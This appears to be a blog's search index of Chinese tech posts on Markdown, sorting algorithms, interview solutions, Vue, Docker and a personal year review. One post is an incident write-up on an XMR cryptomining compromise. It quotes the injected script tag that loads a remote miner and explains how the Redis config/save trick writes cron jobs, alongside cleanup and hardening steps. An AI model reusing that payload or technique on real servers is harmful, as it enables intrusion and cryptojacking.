<?xml version="1.0" encoding="utf-8"?>
<search>
  
    <entry>
      <title><![CDATA[Learning Markdown]]></title>
      <url>/software/2019/06/05/markdown/</url>
      <content type="text"><![CDATA[  标题    一级标题    二级标题    三级标题    列表          有序列表      有序列表                  无序列表                      引用          有的人活着，他已经死了；有的人死了，他还活着        图片  链接Google  分割线***  粗体/斜体作者张三  代码    #/bin/shecho "hello world"        区块标识    这是一个区块……        表格|姓名|性别|毕业学校|工资||:—|:—:|:—:|—:||张三|男|重庆交通大学|3200||李四|男|贵州大学|5000||王五|女|北京大学|2000|          :— 左对齐—: 右对齐— 居中        时序图    title: 时序图例子A-&gt;B: 实线实箭头 B--&gt;C: 虚线实箭头 C-&gt;&gt;C: 实线虚箭头 note right of C: 自通知 note over B,C:横跨通知 C-&gt;A:长通知 note left of A:左通知    流程图    start=&gt;start: 开始isLogin=&gt;condition: 是否登录login=&gt;operation: 登录view=&gt;operation: 浏览end=&gt;end: 结束start-&gt;isLoginisLogin(no)-&gt;login-&gt;viewisLogin(yes)-&gt;viewview-&gt;end    graph TBA(开始) --&gt;B[Round edge]B --&gt; C{Decision}C --&gt;|Y| D[Result one]   C --&gt;|N| E[Result two]   D --&gt;F   E --&gt;F[结束]  ]]></content>
      <categories>
        
          <category> software </category>
        
      </categories>
      <tags>
        
          <tag> Markdown </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[数据结构与算法]]></title>
      <url>/algorithms/2019/02/13/data-structure-algorithms/</url>
      <content type="text"><![CDATA[1 数据结构和算法目录首先明确一点：程序=数据结构+算法Table 1: 数据结构和算法表线性结构树堆图排序算法数组、单链表和双链表二叉查找树二叉堆图的理论基础冒泡排序Linux内核中双向链表的经典实现AVL树左倾堆无向图快速排序栈伸展树斜堆有向图插入排序队列红黑树二项堆深度优先搜索和广度优先搜索希尔排序&#xa0;哈夫曼树斐波那契堆拓扑排序选择排序&#xa0;&#x2026;&#x2026;Kruskal算法堆排序&#xa0;&#xa0;&#xa0;Prim算法归并排序&#xa0;&#xa0;&#xa0;Dijkstra算法桶排序&#xa0;&#xa0;&#xa0;&#x2026;基数排序&#xa0;&#xa0;&#xa0;&#xa0;&#x2026;2 线性结构常用的线性结构有：线性表，栈，队列，循环队列，数组。线性表：是一种线性结构，它是具有相同类型的n(n≥0)个数据元素组成的有限序列。顺序表：是在计算机内存中以数组的形式保存的线性表，是指用一组地址连续的存储单元依次存储数据元素的线性结构。链表（Linked list）单链表：它由节点组成，每个节点都包含下一个节点的指针。单链表分为：动态单链表静态单链表单链表操作图示表头为空，表头的后继节点是"节点10"，"节点10"的后继节点是"节点20"。删除节点添加节点单链表的特点是：节点的链接方向是单向的；相对于数组来说，单链表的的随机访问速度较慢，但是单链表删除/添加数据的效率很高。双链表：它也是由节点组成，它的每个数据结点中都有两个指针，分别指向直接后继和直接前驱。双链表操作图示表头为空，表头的后继节点为"节点10"(数据为10的节点)；"节点10"的后继节点是"节点20"(数据为10的节点)，"节点20"的前继节点是"节点10"；"节点20"的后继节点是"节点30"，"节点30"的前继节点是"节点20"；...；末尾节点的后继节点是表头。删除节点添加节点代码实现Java/** * Java &#23454;&#29616;&#30340;&#21452;&#21521;&#38142;&#34920;&#12290;  * &#27880;&#65306;java&#33258;&#24102;&#30340;&#38598;&#21512;&#21253;&#20013;&#26377;&#23454;&#29616;&#21452;&#21521;&#38142;&#34920;&#65292;&#36335;&#24452;&#26159;:java.util.LinkedList */public class DoubleLink&lt;T&gt;循环链表单循环链表双循环链表栈（stack）：是计算机科学中一种特殊的串列形式的抽象数据类型，按照后进先出（LIFO, Last In First Out）的原理运作。其特殊之处在于只能允许在链表或数组的一端（称为堆栈顶端指针，英语：top）进行加入数据（英语：push）和输出数据（英语：pop）的运算。队列：又称为伫列（queue），是先进先出（FIFO, First-In-First-Out）的线性表。队列只允许在后端（称为rear）进行插入操作，在前端（称为front）进行删除操作。数组：在计算机科学中，数组数据结构（英语：array data structure），简称数组（英语：Array），是由相同类型的元素（element）的集合所组成的数据结构，分配一块连续的内存来存储。数组的特点是：数据的元素在上下界内是连续的；随机访问速度快。3 树3.1 二叉树3.2 AVL 树3.3 伸展树3.4 红黑树3.5 哈夫曼树4 堆5 图6 排序算法6.1 冒泡排序(BubbleSort)6.1.1 介绍(Introduction)enBubblesort is a popular,but inefficient,sorting algorithm. It works by repeatedly swapping adjacent elements that are out of order.cn冒泡排序是一种较简单的排序算法。它会遍历若干次要排序的数列，每次遍历时，它都会从前往后依次的比较相邻两个数的大小；如果前者比后者大，则交换它们的位置。这样，一次遍历之后，最大的元素就在数列的末尾！ 采用相同的方法再次遍历时，第二大的元素就被排列在最大元素之前。重复此操作，直到整个数列都有序为止！6.1.2 伪代码(pseudo code)Listing 1: pseudo codefor i = 1 to A.length - 1    for j = A:length downto i + 1        if A[j] &lt; A[j-1]               exchange A[j] with A[j - 1]6.1.3 时间复杂度和稳定性冒泡排序的时间复杂度是O(N2)。假设被排序的数列中有N个数。遍历一趟的时间复杂度是O(N)，需要遍历多少次呢？N-1次！因此，冒泡排序的时间复杂度是O(N2)。冒泡排序是稳定的算法，它满足稳定算法的定义。算法稳定性 -- 假设在数列中存在a[i]=a[j]，若在排序之前，a[i]在a[j]前面；并且排序之后，a[i]仍然在a[j]前面。则这个排序算法是稳定的！6.1.4 实现(realization)CListing 2: Cint i,j;int flag; // &#26631;&#35760;for (i=n-1; i&gt;0; i--){    flag = 0; // &#21021;&#22987;&#21270;&#26631;&#35760;&#20026;0    // &#23558;a[0...i]&#20013;&#26368;&#22823;&#30340;&#25968;&#25454;&#25918;&#22312;&#26411;&#23614;    for (j=0; j&lt;i; j++)    {        if (a[j] &gt; a[j+1])        {            swap(a[j], a[j+1]);            flag = 1;    // &#33509;&#21457;&#29983;&#20132;&#25442;&#65292;&#21017;&#35774;&#26631;&#35760;&#20026;1        }    }    if (flag==0)        break;// &#33509;&#27809;&#21457;&#29983;&#20132;&#25442;&#65292;&#21017;&#35828;&#26126;&#25968;&#21015;&#24050;&#26377;&#24207;&#12290;} C#Listing 3: C#//Core code.for (int i = 0; i &lt; arrInt.Length - 1; i++){    for (int j = 1; j &lt; arrInt.Length - i; j++)    {        if (arrInt[j] &lt; arrInt[j - 1])        {            //&#20132;&#25442;&#20540;            int temp = arrInt[j];            arrInt[j] = arrInt[j - 1];            arrInt[j - 1] = temp;        }    }}JavaListing 4: Javapublic static void BubbleSort(int[] arr,int num) {    for (int i = 0; i &lt; arr.length; i++) {            for (int j = num-1; j &gt;i; j--) {                    if (arr[i]&gt;arr[j]) {                            int temp=arr[i];                            arr[i]=arr[j];                            arr[j]=temp;                    }            }    }    for(int k=0;k&lt;num;k++){            System.out.print(arr[k]+" ");    }}PHPListing 5: PHPfunction BubbleSort($arr){        for($i=0;$i&lt;count($arr);$i++){                for($j=0;$j&lt;$i;$j++){                        if($arr[$i]&gt;$arr[$j]){                                $temp = $arr[$i];                                $arr[$i] = $arr[$j];                                $arr[$j] = $temp;                        }                }        }        foreach($arr as $value){                echo $value." ";        }}6.2 快速排序(QuickSort)6.2.1 介绍(Introduction)cn快速排序(Quick Sort)使用分治法策略。基本思想是：选择一个基准数，通过一趟排序将要排序的数据分割成独立的两部分；其中一部分的所有数据都比另外一部分的所有数据都要小。然后，再按此方法对这两部分数据分别进行快速排序，整个排序过程可以递归进行，以此达到整个数据变成有序序列。快速排序流程：(1) 从数列中挑出一个基准值。(2) 将所有比基准值小的摆放在基准前面，所有比基准值大的摆在基准的后面(相同的数可以到任一边)；在这个分区退出之后，该基准就处于数列的中间位置。(3) 递归地把"基准值前面的子数列"和"基准值后面的子数列"进行排序。6.2.2 伪代码(pseudo code)6.2.3 时间复杂度和稳定快速排序的时间复杂度在最坏情况下是O(N2)，平均的时间复杂度是O(N*lgN)。 这句话很好理解：假设被排序的数列中有N个数。遍历一次的时间复杂度是O(N)，需要遍历多少次呢？至少lg(N+1)次，最多N次。(01) 为什么最少是lg(N+1)次？快速排序是采用的分治法进行遍历的，我们将它看作一棵二叉树，它需要遍历的次数就是二叉树的深度，而根据完全二叉树的定义，它的深度至少是lg(N+1)。因此，快速排序的遍历次数最少是lg(N+1)次。(02) 为什么最多是N次？这个应该非常简单，还是将快速排序看作一棵二叉树，它的深度最大是N。因此，快读排序的遍历次数最多是N次。快速排序是不稳定的算法，它不满足稳定算法的定义。6.2.4 实现(realization)C/*** arr -- &#24453;&#25490;&#24207;&#30340;&#25968;&#32452;* left -- &#25968;&#32452;&#30340;&#24038;&#36793;&#30028;* right -- &#25968;&#32452;&#30340;&#21491;&#36793;&#30028;*/void quick_sort(int arr[],int left,int right){    if(left &lt; right){            int i,j,k;            i = left;            j = right;            k = arr[i];            while(i &lt; j){                    while(i &lt; j &amp;&amp; arr[j] &gt; k){                            j--; // &#20174;&#21491;&#24448;&#24038;&#25214;&#19968;&#20010;&#23567;&#20110; k &#30340;&#25968;                    }                    if(i &lt; j){                            arr[i++] = arr[j];                    }                    while(i&lt;j &amp;&amp; arr[i] &lt; k){                            i++; // &#20174;&#24038;&#24448;&#21491;&#25214;&#31532;&#19968;&#20010;&#22823;&#20110; k &#30340;&#25968;                    }            }            arr[i] = k;            quick_sort(arr,left,i-1);            quick_sort(arr,i+1,right);    }}JavaPHP6.3 插入排序(InsertSort)6.3.1 介绍(Instoduction)6.3.2 伪代码(pseudo code)for j=2 to A.length    key=A[j];    //Insert A[j] into the sorted sequence A[1..j-1]    i=j-1    while i&gt;0 and A[i]&gt;key         A[i+1]=A[i]         i=i-1    A[i+1]=key6.3.3 实现(realization)6.3.4 分而治之(divideand-conquer)6.4 选择排序6.5 希尔排序6.6 归并排序6.7 基数排序6.8 堆排序7 参考资料线性表-维基百科数据结构与算法系列 目录]]></content>
      <categories>
        
          <category> algorithms </category>
        
      </categories>
      <tags>
        
          <tag> Data-Structure </tag>
        
          <tag> Algorithms </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[剑指 Offer]]></title>
      <url>/algorithms/2019/02/12/offer/</url>
      <content type="text"><![CDATA[1 前言本文内容是《剑指 Offer》的问题求解整理，使其文档化，主要包括问题的代码编写（主流语言）和思路分析。文章结构按照10小题为一章节来划分，每一小题的编程语言的实现一般按照【低级语言》脚本语言》高级语言】的格式来展示。引用别人的一句话“我们不生产代码，我们是代码的搬运工”。文章内容仅供参考。2 1~10二维数组的查找题目描述在一个二维数组中（每个一维数组的长度相同），每一行都按照从左到右递增的顺序排序，每一列都按照从上到下递增的顺序排序。请完成一个函数，输入这样的一个二维数组和一个整数，判断数组中是否含有该整数。   &lt;?phpfunction Find($target, $array){    foreach($array as $key=&gt;$val){        if(in_array($target,$val)){            return "true";        }    }    return "false";}while(fscanf(STDIN,"%d,%s",$a,$b) == 2){    $target = $a;    eval('$array='.$b.';');    try{        echo Find($target,$array)."\n";    }catch(Exception $e){        die;    }}   public class Solution {    public boolean Find(int target, int [][] array) {        int rows = array.length;        int cols = array[0].length;        int i=rows-1,j=0;        while(i&gt;=0 &amp;&amp; j&lt;cols){            if(target&lt;array[i][j])                i--;            else if(target&gt;array[i][j])                j++;            else                return true;        }        return false;    }}# -*- coding:utf-8 -*-class Solution: # array &#20108;&#32500;&#21015;&#34920; def Find(self, target, array):     rows=len(array)     cols=len(array[0])     i=rows-1     j=0     while i&gt;=0 and j&lt;cols:         if target&lt;array[i][j]:             i -= 1         elif target&gt;array[i][j]:             j += 1         else:             return True     return False   class Solution{    public bool Find(int target, int[][] array)    {        int row=0;        int col=array[0].Length-1;        while(row&lt;=array.Length-1&amp;&amp;col&gt;=0){            if(target==array[row][col])                return true;            else if(target&gt;array[row][col])                row++;            else                col--;        }        return false;    }}解题思路矩阵是有序的，从左下角来看，向上数字递减，向右数字递增，因此从左下角开始查找，当要查找数字比左下角数字大时。右移要查找数字比左下角数字小时，上移。替换空格题目描述请实现一个函数，将一个字符串中的每个空格替换成“%20”。例如，当字符串为We Are Happy.则经过替换之后的字符串为We%20Are%20Happy。   &lt;?php// &#30452;&#25509;&#20351;&#29992;&#20989;&#25968;function replaceSpace($str){    return str_replace(' ','%20',$str);}// &#19981;&#20801;&#35768;&#30452;&#25509;&#35843;&#29992;&#20869;&#32622;&#20989;&#25968;&lt;?phpfunction replaceSpace($str){    $res = '';    $strLength = strlen($str);    for($i=0;$i&lt;$len;$i++){        if($str[$i]==' '){                $res .='%20';        }else{                $res .=$str[$i];        }    }    return $res;}解题思路问题1：替换字符串，是在原来的字符串上做替换，还是新开辟一个字符串做替换！问题2：在当前字符串替换，怎么替换才更有效率（不考虑内置的replace方法）。从前往后替换，后面的字符要不断往后移动，要多次移动，所以效率低下从后往前，先计算需要多少空间，然后从后往前移动，则每个字符只为移动一次，这样效率更高一点。从尾到头打印链表题目描述输入一个链表，按链表值从尾到头的顺序返回一个ArrayList。     &lt;?php/*class ListNode{    var $val;    var $next = NULL;    function __construct($x){        $this-&gt;val = $x;    }}*/function printListFromTailToHead($head){    $arrayList = [];    while($head !== null){        $arrayList[]=$head-&gt;val;        $head=$head-&gt;next;    }    return array_reverse($arrayList);}解题思路有三种思路，第一就是利用栈先入后出的特性完成；第二就是存下来然后进行数组翻转；第三是利用递归。重建二叉树题目描述输入某二叉树的前序遍历和中序遍历的结果，请重建出该二叉树。假设输入的前序遍历和中序遍历的结果中都不含重复的数字。例如输入前序遍历序列{1,2,4,7,3,5,6,8}和中序遍历序列{4,7,2,1,5,3,8,6}，则重建二叉树并返回。解题思路题目描述解题思路题目描述解题思路题目描述解题思路题目描述解题思路题目描述解题思路3 11~20题目描述解题思路题目描述解题思路题目描述解题思路题目描述解题思路题目描述解题思路4 21~30题目描述解题思路题目描述解题思路题目描述解题思路题目描述解题思路题目描述解题思路题目描述解题思路题目描述解题思路题目描述解题思路题目描述解题思路题目描述解题思路]]></content>
      <categories>
        
          <category> algorithms </category>
        
      </categories>
      <tags>
        
          <tag> 剑指-Offer </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[总结2018，展望2019]]></title>
      <url>/%E8%81%8C%E4%B8%9A%E7%94%9F%E6%B6%AF/2019/01/17/%E6%80%BB%E7%BB%932018-%E5%B1%95%E6%9C%9B2019/</url>
      <content type="text"><![CDATA[感谢您阅读此文，如果您发现任何错误，请发邮件至 zrg1390556487@gmail.com，谢谢！1 喜乐哀愁的20181.1 大事记失业21天继2017年12月31号从上家公司辞职后，于2018年1月22日入职现在的公司，当时也算为徘徊了半个多月的自己找到了归宿。大雨过后的车祸2018年3月3日20点35分，在二环快速B线（北）下高架桥的时候，自己驾驶的一辆共享汽车追尾了一辆起亚k3的小汽车，回头想了想，还是觉得离老司机的路尚远。后续赔付了4000多块，事情得以终结。公司辞职潮2018年4月，所在部门掀起了一批辞职潮，个中缘由在这就不细说了！对于一个刚转正，继续回血的新人来说，实在是说不清楚的。\\由于4月份、5月份部门内辞职了一大批核心技术人员，致使很多工作压到了我这里，倍感极具挑战性。入职4个月，从中也学到了很多之前没有接触的新知识，这点很欣慰，继续加油！！！搭建个人博客2018年7月3日，在 Github 上使用 Jekyll 搭建了自己的 Blog，从此提醒自己记录开发笔记。新项目2018年11月，被编入了一个新项目（政府项目），在该项目中技术上没学到什么，不过在其他方面算是“受益匪浅”吧。，项目还在继续，在这就不细说了外公过逝2018年12月15日，外公过逝了，我是晚上19点多接到父亲电话的，之后联系了表妹、姨兄，本欲赶往参加葬礼，后面被父亲劝住了。\\父亲说了一句话：活着的时候你已多孝，死了不不能前来也不会怎么样！也就是那句话吧！【生前早尽孝,莫待人老空哭坟】1.2 总结如果说要给 2018 年做一个总结的话，那就是两个字：不顺。按说，2017年是本命年，应该才是不顺的一年，也许本命年过度到 2018 了吧！期待 2019 年顺顺利利吧！不管工作、生活、学习都能有所进步。2 期待新未来20192.1 未来展望一起回想和展望2019年1月6-7日，和大学同学（老蒋，超哥，礼杰，我）聊了好久，说了很多！回想了在学校时的想法，回顾了从毕业到现在的种种，尤感岁月蹉跎，一眨眼2年半过去了，最后各自说了自己未来3年的计划。\\这次相互间的交流让我感到了一股压力，让我不得不再次思考要不要驻留昆明，如果留昆明，那就意味着要买房，我一直是一个崇尚自由的人，不想被绑架，但父母又希望我能回老家某个职位，我有点不知所措。新的一年，新的方向进一步提高职业技能，掌握专长技能，总结并构建技能框架，积累工作经验。进一步学习，保留原有的常规学习内容：汉字书写练习、英语口语加强、专业知识积累。新技术学习也很重要，不能固步自封，向前看。生活上，提高情商吧！女朋友一直说我情商低，是时候给自己定个小目标了！2.2 小小心愿工作技能提升，排在第一位一直都是很有必要的。找一份合适自己的工作很重要。升职加薪，当然是 2019 年追求的终极目标，毕竟有余力才能创造更多的东西，不管是工作还是生活上。]]></content>
      <categories>
        
          <category> 职业生涯 </category>
        
      </categories>
      <tags>
        
          <tag> 年终总结 </tag>
        
          <tag> 未来展望 </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[vue实例属性之el-template-render]]></title>
      <url>/javascript/2018/12/29/vue%E5%AE%9E%E4%BE%8B%E5%B1%9E%E6%80%A7%E4%B9%8Bel_template_render/</url>
      <content type="text"><![CDATA[感谢您阅读此文，如果您发现任何错误，请发邮件至 zrg1390556487@gmail.com，谢谢！1 优先级1.1 优先级-示例&lt;div class="vapp-1"&gt;&lt;/div&gt;&lt;div class="vapp-2"&gt;&lt;/div&gt;&lt;div class="vapp-3"&gt;&lt;/div&gt;new Vue({  el: '.vapp-1',  data: {    info: '&#36825;&#26159;&#36890;&#36807;el&#23646;&#24615;&#33719;&#21462;&#25346;&#36733;&#20803;&#32032;&#30340;outerHTML&#26041;&#24335;&#28210;&#26579;&#12290;'  },  template: '&lt;div&gt;&#36825;&#26159;template&#23646;&#24615;&#27169;&#26495;&#28210;&#26579;&#12290;&lt;/div&gt;',  render: function(h){    return h('div', {}, '&#36825;&#26159;render&#23646;&#24615;&#26041;&#24335;&#28210;&#26579;&#12290;')  }})new Vue({  el: '.vapp-2',  data: {    info: '&#36825;&#26159;&#36890;&#36807;el&#23646;&#24615;&#33719;&#21462;&#25346;&#36733;&#20803;&#32032;&#30340;outerHTML&#26041;&#24335;&#28210;&#26579;&#12290;'  },  template: '&lt;div&gt;&#36825;&#26159;template&#23646;&#24615;&#27169;&#26495;&#28210;&#26579;&#12290;&lt;/div&gt;'})new Vue({  el: '.vapp-3',  data: {    info: '&#36825;&#26159;&#36890;&#36807;el&#23646;&#24615;&#33719;&#21462;&#25346;&#36733;&#20803;&#32032;&#30340;outerHTML&#26041;&#24335;&#28210;&#26579;&#12290;'  }})2 独立构建和运行时构建ue.js 1.0，编译器需要依赖浏览器的DOM，所以无法将编译器和运行时分开。因此在Vue.js 1.0分发包中，编译器和运行时是打包在一起，都在浏览器端执行。Vue.js 2.0，为了支持服务端渲染(server-side rendering)，编译器不能依赖浏览器的DOM，所以必须将编译器和运行时分开。于是形成了独立构建（编译器 + 运行时）和运行时构建（仅运行时）。显而易见，运行时构建体积要小于独立构建。1. 模板编译器模板编译器的职责是将模板字符串编译为纯JavaScript的渲染函数，即将&lt;template&gt;编译成render函数。2. Vue.js的执行过程包含编译过程和运行过程，在编译过程，编译器将字符串模板(template)编译为渲染函数(render)，在运行过程，调用渲染函数。3. 运行时构建运行时构建指不能进行模板编译的Vue库。运行时构建不包含模板编译器，即不支持template选项，如果使用vue-loader和vueify预编译模板，只需要打包运行时，而不需要打包编译器。运行时构建，可以用render选项，但它只在单文件组件中起作用，因为单文件组件的模板是在构建时预编译到render函数中，运行时构建只有独立构建大小的30%，只有16Kb min+gzip大小。// &#19981;&#38656;&#35201;&#32534;&#35793;&#22120;new Vue({  render (h) {    return h('div', this.hello)  }})4. 独立构建独立构建指能够将template模板或者从el挂载元素提取的模板编译成渲染函数的Vue库，独立构建包含模板编译器，可以用template选项实时编译模板。// &#38656;&#35201;&#32534;&#35793;&#22120;new Vue({  template: '&lt;div&gt;&lt;/div&gt;'})使用vue-cli生成项目时，会提醒使用哪种构建方式，npm包默认导出的是运行时构建，即runtime版本vue.runtime.common.js，如果想使用独立构建，需要在webpack.config.js中配置alias。3 Referencesel，template，render属性优先性]]></content>
      <categories>
        
          <category> javascript </category>
        
      </categories>
      <tags>
        
          <tag> Vue.js </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[XMR 恶意挖矿脚本处理笔记]]></title>
      <url>/linux/2018/12/27/xmr%E6%81%B6%E6%84%8F%E6%8C%96%E7%9F%BF%E8%84%9A%E6%9C%AC%E5%A4%84%E7%90%86%E7%AC%94%E8%AE%B0/</url>
      <content type="text"><![CDATA[感谢您阅读此文，如果您发现任何错误，请发邮件至 zrg1390556487@gmail.com，谢谢！1 事件描述1.1 概况服务器安装系统为 CentOS 7，服务器用户一直采用密钥登录，通过用户登入攻击的可能性几乎为零。服务器上所有站点使用宝塔面板面板管理，所以可能性是通过攻破了宝塔面板进入，然后注入恶意挖矿脚本的。网站无法加载，会出现浏览器卡死的情况。1.2 表象下面陈述被攻击后的表象：服务器资源被大量占用，资源占用率飙升；服务器所有JS文件被篡改，向输出页面增加了一个script标签（document.write('&lt;script src="http://t.cn/EvlonFh"&gt;&lt;/script&gt;&lt;script&gt;OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")&lt;/script&gt;');）网站无法加载，会出现浏览器卡死的情况2 问题排查及解决2.1 排查1. 访问服务器上运行的站点（包括宝塔面板），F12，发现不停访问一个wss的地址（wss://xmr.omine.org:8181/），并且很慢。2. 搜索这个地址，得知此为 XMR 恶意挖矿脚本。3. 查看系统任务计划，发现定期恶意脚本的计划内容# crontab -l4. 由于redis没有安全配置，黑客利用redis安全漏洞入侵了服务器。攻击者通过redis命令 config set与save完成入侵过程.使用redis-cli -h &lt;ip&gt; &lt;port&gt; 登录服务redis-server，将redis的数据文件改到/var/spool/cron/root文件中，再通save 命令将定时任务shell脚本写入到/var/spool/cron/root 中，完成定时执行shell脚本，来实现提权及其它操作。2.2 解决1. 整理清理脚本# &#20808;&#20851;&#25481;redis&#31471;&#21475;iptables -A INPUT -p tcp --dport 6379 -j DROP# &#28165;&#29702;&#23450;&#26102;&#20219;&#21153;crontab -r# &#28165;&#38500;redis key Back1 Back3 Back3redis-cli -h xxx.xxx.xxx.xxx -x del Back1redis-cli -h xxx.xxx.xxx.xxx -x del Back2redis-cli -h xxx.xxx.xxx.xxx -x del Back3redis-cli -h xxx.xxx.xxx.xxx -x CONFIG SET dbfilename dump.rdbredis-cli -h xxx.xxx.xxx.xxx -x CONFIG SET dir /tmpredis-cli -h xxx.xxx.xxx.xxx -x save# &#28165;&#29702;&#36816;&#34892;&#33050;&#26412;kill -9 `ps -ef|grep shz.sh|grep -v grep|awk '{print $2}'`kill -9 `ps -ef|grep zigw|grep -v grep|awk '{print $2}'`kill -9 `ps -ef|grep cmd|grep -v grep|awk '{print $2}'`chattr -i /etc/zigwchattr -i /etc/shz.shchattr -i /tmp/zigwchattr -i /tmp/shz.shrm -rf /etc/shz.shrm -rf /etc/gmbpr2rm -rf /etc/zigwrm -rf /tmp/zigwrm -rf /tmp/shz.shrm -rf ~/.cmd# &#28165;&#29702;SSH&#20813;&#30331;&#24405;&#20449;&#24687;cat /dev/null&gt; ~/.ssh/authorized_keys# &#28165;&#29702;js&#33050;&#26412;find / -name '*.js'|xargs grep -L f4ce9|xargs sed -i '$d'mv /usr/bin/get /usr/bin/wgetmv /usr/bin/url /usr/bin/curl#!/bin/bash# By xzeu# http://www.xzeu.com# Email: admin#xzeu.com# Filename: clearlink.sh#Beginfind / -type f -name '*.js' |xargs fgrep -s -l "e02cf4ce91284dab9bc3fc4cc2a65e28"|xargs ls -l |awk '{print $9}'&gt;jsfile.txtfor file in `cat ~/jsfile.txt`;do  echo $file  # sed -i '/e02cf4ce91284dab9bc3fc4cc2a65e28/d' $file  # cp $file ${file}.baddoneexit 0#END2. 恢复服务器中的js文件(其中grep的参数为小写的L)方法一：删除站点所有感染 js 文件，从代码仓库pull，重新上传部署。方法二：# find / -name '*.js' | xargs grep -l f4ce9 | xargs sed -i '/f4ce9/d'2.3 预防1. 限制内网访问，或者只限制本机访问只监听内网的IP，然后在iptables里面限制访问的主机：在/etc/redis/redis.conf中配置如下：bind 192.168.1.100如果服务只需要本机访问就直接监听127.0.0.1的回环地址就可以了。2. 设置防火墙如果需要其他机器访问，或者设置了slave模式，那就记得加上相应的防火墙设置，命令如下：iptables -A INPUT -s 192.168.1.100/32 -p tcp --dport 6379 -j ACCEPT3. 禁止root用户启动redis使用root权限去运行网络服务是比较有风险的（nginx和apache都是有独立的work用户，而redis没有）。edis crackit 漏洞就是利用root用户的权限来替换或者增加authorized_keys，来获取root登录权限的。使用root切换到redis用户启动服务:useradd -s /sbin/nolog -M redissetsid sudo -u redis /usr/bin/redis-server /etc/redis/redis.conf4. 限制redis文件目录访问权限设置redis的主目录权限为700,如果redis配置文件独立于redis主目录,权限修过为600,因为redis密码明文存储在配置文件中。5. 避免使用熟知的端口,降低被初级扫描的风险在/etc/redis/redis.conf中配置如下：找到port 6379这行，把6379改为9999，记得iptables对应的端口要修改6. 开启redis密码认证,并设置高复杂度密码redis在redis.conf配置文件中，设置配置项requirepass， 开户密码认证。redis因查询效率高，auth这种命令每秒能处理10w次以上，简单的redis的密码极容易为攻击者暴破。 7. 禁用或者重命名危险命令edis crackit漏洞就利用config/save两个命令完成攻击 。 因redis无用户权限限制，建议危险的命令，使用rename配置项进行禁用或重命名，这样外部不了解重命名规则攻击者，就不能执行这类命令。涉及到的命令：FLUSHDB, FLUSHALL, KEYS, PEXPIRE, DEL, CONFIG, SHUTDOWN, BGREWRITEAOF, BGSAVE, SAVE, SPOP, SREM, RENAME, DEBUG, EVAL`以下示例：redis.config文件禁用FLUSHDB、FLUSHALL两个命令；重命名CONFIG、SHUTDOWN命令，添加一个特殊的后缀。这样redis启动后，只能运行CONFIG_b9fc8327c4dee7命令，不能执行CONFIG命令。rename-command CONFIG CONFIG_des327c4dee7dfsfrename-command SHUTDOWN SHUTDOWN_des327c4dee7dfsfrename-command FLUSHDB ""rename-command FLUSHALL ""上述配置将config，flushdb，flushall设置为了空，即禁用该命令，我们也可以命名为一些攻击者难以猜测，我们自己却容易记住的的名字。保存之后，执行/etc/init.d/redis-server restart 重启生效。3 参考XMR恶意挖矿脚本处理笔记XMR恶意挖矿案例简析Redis未授权访问缺陷,服务器变矿机]]></content>
      <categories>
        
          <category> linux </category>
        
      </categories>
      <tags>
        
          <tag> 比特币 </tag>
        
          <tag> 恶意挖矿 </tag>
        
          <tag> 病毒 </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[Docker notes]]></title>
      <url>/%E8%99%9A%E6%8B%9F%E5%8C%96/2018/12/12/docker/</url>
      <content type="text"><![CDATA[感谢您阅读此文，如果您发现任何错误，请发邮件至 zrg1390556487@gmail.com，谢谢！1 Docker 简介1.1 Docker 是什么Docker 是个划时代的开源项目，它彻底释放了计算虚拟化的威力，极大提高了应用的维护效率，降低了云计算应用开发的成本！使用 Docker，可以让应用的部署、测试和分发都变得前所未有的高效和轻松！无论是应用开发者、运维人员、还是其他信息技术从业人员，都有必要认识和掌握 Docker，节约有限的生命。1.2 为什么要用 Docker更高效的利用系统资源更快速的启动时间一致的运行环境持续交付和部署更轻松的迁移更轻松的维护和扩展对比传统虚拟机总结特性容器虚拟机启动秒级分钟级硬盘使用一般为 MB一般为 GB性能接近原生弱于系统支持量单机支持上千个容器一般几十个2 基本概念2.1 镜像1. Docker 镜像Docker 镜像（Image），就相当于是一个 root 文件系统。比如官方镜像 ubuntu:18.04 就包含了完整的一套 Ubuntu 18.04 最小系统的 root 文件系统。Docker 镜像是一个特殊的文件系统，除了提供容器运行时所需的程序、库、资源、配置等文件外，还包含了一些为运行时准备的一些配置参数（如匿名卷、环境变量、用户等）。镜像不包含任何动态数据，其内容在构建之后也不会被改变。2. 分层存储Docker 利用了 Union FS 的技术，将其设计为分层存储的架构。所以严格来说，镜像并非是像一个 ISO 那样的打包文件，镜像只是一个虚拟的概念，其实际体现并非由一个文件组成，而是由一组文件系统组成，或者说，由多层文件系统联合组成。镜像构建时，会一层层构建，前一层是后一层的基础。在构建镜像的时候，需要额外小心，每一层尽量只包含该层需要添加的东西，任何额外的东西应该在该层构建结束前清理掉。2.2 容器容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等。容器内的进程是运行在一个隔离的环境里，使用起来，就好像是在一个独立于宿主的系统下操作一样。每一个容器运行时，是以镜像为基础层，在其上创建一个当前容器的存储层，我们可以称这个为容器运行时读写而准备的存储层为容器存储层。2.3 仓库1. Docker RegistryDocker Registry 中可以包含多个仓库（Repository）；每个仓库可以包含多个标签（Tag）；每个标签对应一个镜像。2. Docker Registry 公开服务开放给用户使用、允许用户管理镜像的 Registry 服务。一般这类公开服务允许用户免费上传、下载公开的镜像，并可能提供收费服务供用户管理私有镜像。最常使用的 Registry 公开服务官方的 Docker HubCoreOSQuay.io时速云镜像仓库网易云镜像服务DaoCloud 镜像市场阿里云镜像库由于某些原因，在国内访问这些服务可能会比较慢。国内的一些云服务商提供了针对 Docker Hub 的镜像服务（Registry Mirror），这些镜像服务被称为加速器。常见的有：阿里云加速器DaoCloud 加速器2.3.1 3 安装 DockerUbuntu：https://yeasy.gitbooks.io/docker_practice/content/install/ubuntu.htmlDebian：https://yeasy.gitbooks.io/docker_practice/content/install/debian.htmlCentOS：https://yeasy.gitbooks.io/docker_practice/content/install/centos.htmlRaspberry Pi：https://yeasy.gitbooks.io/docker_practice/content/install/raspberry-pi.html4 ReferencesDocker — 从入门到实践Union FS]]></content>
      <categories>
